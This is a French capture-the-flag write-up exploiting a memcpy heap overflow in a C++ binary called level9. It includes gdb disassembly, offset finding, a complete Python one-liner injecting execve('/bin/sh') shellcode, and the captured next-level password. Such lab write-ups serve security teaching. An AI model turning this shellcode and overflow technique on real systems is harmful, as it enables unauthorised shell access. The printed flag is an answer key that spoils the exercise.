



# level8


## description
- Il y a un exécutable **level9**.
- L'exécutable ne fais rien.

## Résolution

En regardant les fonctions présente dans l'exécutable avec gdb, on se rends compte que c'est du **c++**.

       0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
Il y a une fonction setAnnotation qui est appelée.

    Dump of assembler code for function _ZN1N13setAnnotationEPc:
       0x0804870e <+0>:     push   ebp
       0x0804870f <+1>:     mov    ebp,esp
       0x08048711 <+3>:     sub    esp,0x18
       0x08048714 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
       0x08048717 <+9>:     mov    DWORD PTR [esp],eax
       0x0804871a <+12>:    call   0x8048520 <strlen@plt>
       0x0804871f <+17>:    mov    edx,DWORD PTR [ebp+0x8]
       0x08048722 <+20>:    add    edx,0x4
       0x08048725 <+23>:    mov    DWORD PTR [esp+0x8],eax
       0x08048729 <+27>:    mov    eax,DWORD PTR [ebp+0xc]
       0x0804872c <+30>:    mov    DWORD PTR [esp+0x4],eax
       0x08048730 <+34>:    mov    DWORD PTR [esp],edx
       0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
       0x08048738 <+42>:    leave  
       0x08048739 <+43>:    ret    
    End of assembler dump.
On voit qu'il y a **memcpy** qui est utilisé. on va pouvoir l'exploiter pour **overflow** et utiliser un **Shell code**.

le Shell code que l'on va utiliser : http://shell-storm.org/shellcode/files/shellcode-827.php

Il faut trouver l'offset.
le pattern que l'on va utilisé: 

    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
l'offset est 108.

Il nous faut l'adresse de debut de notre buffer, pour cela on va faire un breakpoint avec gdb et remplacer la valeur par "AAAA"

    (gdb) run 'AAAA'
    Starting program: /home/user/level9/level9 'AAAA'
    
    Breakpoint 1, 0x0804867c in main ()
    (gdb) x $eax
    0x804a00c:      0x41414141

On a notre adresse **0x804a00c** mais on doit déréférencer donc on ajouter 4 bytes. 
0x804a00x + 4 = 0x804a010.


    python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"' > /tmp/exploit9 && ./level9 `cat /tmp/exploit9`

Reste a afficher le flag

    cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

